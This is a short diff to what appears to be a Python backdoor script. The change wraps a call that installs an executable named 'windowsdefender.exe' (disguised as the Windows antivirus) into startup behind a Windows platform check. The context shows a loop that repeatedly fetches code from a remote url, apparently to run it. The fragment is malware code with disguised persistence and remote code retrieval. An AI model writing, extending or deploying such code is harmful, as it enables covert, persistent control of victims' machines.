@@ -15,7 +15,8 @@ def add2startup(pathname):
 
 
 if __name__=="__main__":
-    add2startup(path.join(os.getcwd(),"windowsdefender.exe"))
+    if platform.system()=="Windows":
+        add2startup(path.join(os.getcwd(),"windowsdefender.exe"))
     while True:
         try:
             code=requests.get(url).text
